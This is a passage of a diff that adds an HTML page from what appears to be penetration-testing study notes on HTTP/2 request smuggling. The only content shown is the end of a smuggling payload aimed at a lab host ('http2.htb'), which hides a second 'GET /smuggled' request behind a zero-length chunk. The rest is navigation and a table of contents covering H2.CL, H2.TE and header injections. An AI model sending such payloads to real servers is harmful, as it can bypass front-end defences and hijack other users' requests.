+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /smuggled HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: http2.htb</span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+  
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/padding-oracles/" class="flex align-center">
+        <img src="/spellbook/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Padding Oracles</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/session-puzzling/" class="flex align-center">
+        <span>Session Puzzling</span>
+        <img src="/spellbook/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#discovery">Discovery</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#discovery-1">Discovery</a></li>
+    <li><a href="#exploitation-1">Exploitation</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#discovery-2">Discovery</a></li>
+    <li><a href="#hold-up-wait-a-minute">Hold up, wait a minute</a></li>
+    <li><a href="#exploitation-2">Exploitation</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#overview-1">Overview</a></li>
+    <li><a href="#h2cl"><code>H2.CL</code></a></li>
+    <li><a href="#h2te"><code>H2.TE</code></a></li>
+    <li><a href="#injections">Injections</a>
+      <ul>
+        <li><a href="#request-header-injection">Request Header Injection</a></li>
+        <li><a href="#header-name-injection">Header Name Injection</a></li>
+        <li><a href="#request-line-injection">Request Line Injection</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
